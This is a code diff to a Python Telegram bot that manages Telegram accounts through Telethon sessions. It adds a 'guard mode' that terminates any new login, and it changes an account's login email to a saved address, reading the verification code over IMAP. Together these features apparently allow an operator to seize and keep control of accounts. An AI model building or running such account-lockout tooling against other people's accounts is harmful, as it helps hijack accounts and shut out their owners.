@@ -11,7 +11,8 @@ from telegram.ext import (
     ConversationHandler,
 )
 from telethon import functions
-from telethon.errors import CodeInvalidError, PasswordHashInvalidError, RPCError
+from telethon.tl import types
+from telethon.errors import CodeInvalidError, RPCError
 
 from config import API_ID, API_HASH
 from database.models import (
@@ -21,6 +22,7 @@ from database.models import (
     get_mail,
     save_mail,
     set_last_otp,
+    update_account,
     is_authorized,
 )
 from keyboards.inline import (
@@ -43,13 +45,14 @@ from utils.helpers import (
     fetch_otp,
     read_email_otp,
     verify_mail,
-    set_recovery_email,
+    set_login_email,
     format_account_info,
     format_device,
     safe_edit,
     denied_text,
 )
 from utils.session_utils import verify_and_get_client
+from utils.guard import GuardManager, start_guard
 
 logger = logging.getLogger(__name__)
 
@@ -62,9 +65,8 @@ logger = logging.getLogger(__name__)
     CONFIRM_REVOKE,
     CONFIRM_CLEAR,
     CONFIRM_CHANGE_MAIL,
-    WAITING_CHANGE_MAIL_2FA,
     WAITING_CHANGE_MAIL_CODE,
-) = range(9)
+) = range(8)
 
 
 class _NeedManualCode(Exception):
@@ -273,10 +275,16 @@ async def show_devices(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += format_device(dev, i) + "\n"
     text += "_Tap a device below to terminate it._"
 
+    manager = GuardManager(context.application)
+    account_uid = context.user_data.get("current_user_id")
+    guard_active = account_uid is not None and manager.get(
+        manager.key(update.effective_user.id, account_uid)
+    ) is not None
+
     await safe_edit(query, 
         text,
         parse_mode="Markdown",
-        reply_markup=device_dashboard_kb(devices),
+        reply_markup=device_dashboard_kb(devices, guard_active),
     )
     return DEVICE_LIST
 
@@ -341,6 +349,30 @@ async def device_action_handler(update: Update, context: ContextTypes.DEFAULT_TY
             reply_markup=back_to_dashboard_kb(),
         )
         return DEVICE_LIST
+
+    # ── Toggle guard mode for this account ──────────────────────────
+    elif data == "guard_toggle":
+        user_id = update.effective_user.id
+        account_uid = context.user_data.get("current_user_id")
+        account_id = context.user_data.get("current_account_id")
+        manager = GuardManager(context.application)
+        key = manager.key(user_id, account_uid)
+
+        if manager.get(key):
+            await manager.stop(key, notify=True)
+            if account_id:
+                await update_account(account_id, {"guard_active": False})
+            await safe_edit(query, "🛡️ **Guard mode OFF** for this account.")
+        else:
+            await start_guard(context.application, user_id, account_uid,
+                              client, update.effective_chat.id)
+            if account_id:
+                await update_account(account_id, {"guard_active": True})
+            await safe_edit(query, 
+                "🛡️ **Guard mode ON** for this account.\n\n"
+                "Any new login will be terminated automatically.")
+        await asyncio.sleep(1)
+        return await show_devices(update, context)
 
     # ── Revoke bot connection (confirm) ─────────────────────────────
     elif data == "revoke_bot":
@@ -549,7 +581,7 @@ async def check_mail_dash(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  CHANGE MAIL
+#  CHANGE LOGIN MAIL
 # ═══════════════════════════════════════════════════════════════════════════
 async def ask_change_mail_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show the Yes/Cancel confirmation before changing the account's login mail."""
@@ -561,7 +593,7 @@ async def ask_change_mail_email(update: Update, context: ContextTypes.DEFAULT_TY
 
     if not saved_mail:
         await safe_edit(query, 
-            "📧 **Change Telegram Login Mail**\n\n"
+            "📧 **Change Login Email**\n\n"
             "No saved mail found. Set one first with:\n"
             "`/addmail email app_password`\n\n"
             "Then come back and tap Change Mail again.",
@@ -572,8 +604,8 @@ async def ask_change_mail_email(update: Update, context: ContextTypes.DEFAULT_TY
 
     email = saved_mail["email"]
     await safe_edit(query, 
-        f"📧 **Change Telegram Login Mail?**\n\n"
-        f"├─ Account mail will be set to: `{email}`\n"
+        f"📧 **Change Login Email?**\n\n"
+        f"├─ New login email: `{email}`\n"
         f"└─ Telegram sends a code to that mail; the bot reads & confirms it.\n\n"
         f"_Confirm below._",
         parse_mode="Markdown",
@@ -583,7 +615,7 @@ async def ask_change_mail_email(update: Update, context: ContextTypes.DEFAULT_TY
 
 
 async def start_change_mail(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """User pressed Yes — check the account's login-mail option, then change it."""
+    """User pressed Yes — check for an existing login email, then change it."""
     query = update.callback_query
     await query.answer()
     client = _get_client(context)
@@ -604,7 +636,7 @@ async def start_change_mail(update: Update, context: ContextTypes.DEFAULT_TYPE):
     email_address = saved_mail["email"]
     app_password = saved_mail["app_password"]
 
-    # Check whether this account has a recovery ("login") mail option at all.
+    # Check whether this account has a LOGIN email (not the 2FA recovery email).
     try:
         pwd = await client(functions.account.GetPasswordRequest())
     except RPCError as e:
@@ -612,73 +644,33 @@ async def start_change_mail(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         reply_markup=manage_dashboard_kb())
         return DASHBOARD
 
-    if not getattr(pwd, "has_recovery", False):
+    current_pattern = (getattr(pwd, "login_email_pattern", "") or "").strip()
+    if not current_pattern:
         await safe_edit(query, 
-            "❌ **This account doesn't have a login mail option.**\n\n"
-            "No recovery email is configured on this account, so there is "
-            "nothing to change.",
+            "❌ **This account has no login email configured.**\n\n"
+            "There is no login email to change on this account.",
             parse_mode="Markdown",
             reply_markup=manage_dashboard_kb(),
         )
         return DASHBOARD
 
-    # Account has a login mail — changing it needs the 2FA password if set.
-    if getattr(pwd, "has_password", False):
-        context.user_data["pending_email"] = email_address
-        context.user_data["pending_app_pass"] = app_password
-        await safe_edit(query, 
-            "🔒 **2FA enabled** on this account.\n\n"
-            "Changing the login mail requires the account's **2FA password**.\n"
-            "Send the 2FA password (not your email app password).",
-            parse_mode="Markdown",
-            reply_markup=cancel_kb("change_mail"),
-        )
-        return WAITING_CHANGE_MAIL_2FA
-
-    status_msg = await query.message.reply_text("📧 Sending verification code to email...")
-    return await _do_change_mail(update, context, email_address, app_password, None, status_msg)
-
-
-async def change_mail_no(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """User pressed Cancel on the change-mail confirmation."""
-    return await _refresh_dashboard(update, context)
-
-
-async def receive_change_mail_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    password = update.message.text.strip()
-    email_address = context.user_data.get("pending_email")
-    app_password = context.user_data.get("pending_app_pass")
-    client = _get_client(context)
-
-    if not client or not client.is_connected() or not email_address:
-        await update.message.reply_text("❌ Session lost.", reply_markup=main_menu_kb())
-        return ConversationHandler.END
-
-    status_msg = await update.message.reply_text("📧 Sending verification code to email...")
-    return await _do_change_mail(update, context, email_address, app_password, password, status_msg)
-
-
-async def _do_change_mail(update, context, email_address, app_password, current_password, status_msg):
-    client = _get_client(context)
+    await safe_edit(query, 
+        f"📧 **Changing login email**\n\n"
+        f"├─ Current: `{current_pattern}`\n"
+        f"└─ New: `{email_address}`\n\n_Sending verification code..._",
+        parse_mode="Markdown",
+    )
 
     async def email_code_callback(code_length: int) -> str:
-        await status_msg.edit_text(
-            f"📧 Code sent to `{email_address}`\nReading via IMAP...",
-            parse_mode="Markdown",
-        )
         code = await read_email_otp(email_address, app_password, wait_seconds=90)
         if code:
             return code
         raise _NeedManualCode()
 
     try:
-        await set_recovery_email(
-            client, email_address, email_code_callback,
-            current_password=current_password,
-        )
-        await status_msg.edit_text(
-            f"✅ **Email Verified & Set!**\n\nRecovery email: `{email_address}`\n\n"
-            "_This email can now be used to recover the account._",
+        await set_login_email(client, email_address, email_code_callback)
+        await safe_edit(query, 
+            f"✅ **Login email updated!**\n\nNew login email: `{email_address}`",
             parse_mode="Markdown",
             reply_markup=manage_dashboard_kb(),
         )
@@ -686,7 +678,7 @@ async def _do_change_mail(update, context, email_address, app_password, current_
 
     except _NeedManualCode:
         context.user_data["pending_email"] = email_address
-        await status_msg.edit_text(
+        await safe_edit(query, 
             "⚠️ Could not auto-read the code from the mailbox.\n\n"
             f"Open `{email_address}`, find the Telegram verification code, and "
             "send the **code** here.",
@@ -695,42 +687,33 @@ async def _do_change_mail(update, context, email_address, app_password, current_
         )
         return WAITING_CHANGE_MAIL_CODE
 
-    except PasswordHashInvalidError:
-        context.user_data["pending_email"] = email_address
-        context.user_data["pending_app_pass"] = app_password
-        await status_msg.edit_text(
-            "❌ **Wrong 2FA password.**\n\nSend the correct 2FA password to retry.",
-            parse_mode="Markdown",
-            reply_markup=cancel_kb("change_mail"),
-        )
-        return WAITING_CHANGE_MAIL_2FA
-
     except CodeInvalidError:
-        await status_msg.edit_text(
-            "❌ **Invalid email code** returned by the bot.\n\n"
-            "Send the code manually.",
+        await safe_edit(query, 
+            "❌ **Invalid email code.**\n\nSend the code manually.",
             parse_mode="Markdown",
             reply_markup=cancel_kb("change_mail_manual"),
         )
         return WAITING_CHANGE_MAIL_CODE
 
     except RPCError as e:
-        await status_msg.edit_text(
-            f"❌ Failed to change mail: {e}",
-            reply_markup=manage_dashboard_kb(),
-        )
+        await safe_edit(query, f"❌ Failed to change login email: {e}",
+                        reply_markup=manage_dashboard_kb())
         return DASHBOARD
 
     except Exception as e:
-        logger.exception("Change mail failed")
-        await status_msg.edit_text(
-            f"❌ Failed to change mail: {e}",
-            reply_markup=manage_dashboard_kb(),
-        )
+        logger.exception("Change login email failed")
+        await safe_edit(query, f"❌ Failed to change login email: {e}",
+                        reply_markup=manage_dashboard_kb())
         return DASHBOARD
 
 
+async def change_mail_no(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """User pressed Cancel on the change-login-email confirmation."""
+    return await _refresh_dashboard(update, context)
+
+
 async def receive_change_mail_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Manual code entry for the login-email change."""
     code_text = update.message.text.strip()
     email = context.user_data.get("pending_email")
     client = _get_client(context)
@@ -740,9 +723,12 @@ async def receive_change_mail_code(update: Update, context: ContextTypes.DEFAULT
         return ConversationHandler.END
 
     try:
-        await client(functions.account.ConfirmPasswordEmailRequest(code_text))
+        await client(functions.account.VerifyEmailRequest(
+            purpose=types.EmailVerifyPurposeLoginChange(),
+            verification=types.EmailVerificationCode(code=code_text),
+        ))
         await update.message.reply_text(
-            f"✅ **Email Verified & Set!**\n\nRecovery email: `{email}`",
+            f"✅ **Login email updated!**\n\nNew login email: `{email}`",
             parse_mode="Markdown",
             reply_markup=manage_dashboard_kb(),
         )
@@ -803,7 +789,7 @@ def get_manage_conversation_handler():
             DEVICE_LIST: [
                 CallbackQueryHandler(
                     device_action_handler,
-                    pattern=r"^dev:|^dev_yes:|^dev_no$|^revoke_all$|^revoke_bot$",
+                    pattern=r"^dev:|^dev_yes:|^dev_no$|^revoke_all$|^revoke_bot$|^guard_toggle$",
                 ),
                 CallbackQueryHandler(dashboard_handler, pattern=r"^mng_back_dash$"),
                 CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
@@ -824,10 +810,6 @@ def get_manage_conversation_handler():
                 CallbackQueryHandler(start_change_mail, pattern=r"^cm_yes$"),
                 CallbackQueryHandler(change_mail_no, pattern=r"^cm_no$"),
                 CallbackQueryHandler(cancel_manage, pattern=r"^cancel_"),
-            ],
-            WAITING_CHANGE_MAIL_2FA: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_change_mail_2fa),
-                CallbackQueryHandler(cancel_manage, pattern=r"^cancel_change_mail$"),
             ],
             WAITING_CHANGE_MAIL_CODE: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, receive_change_mail_code),
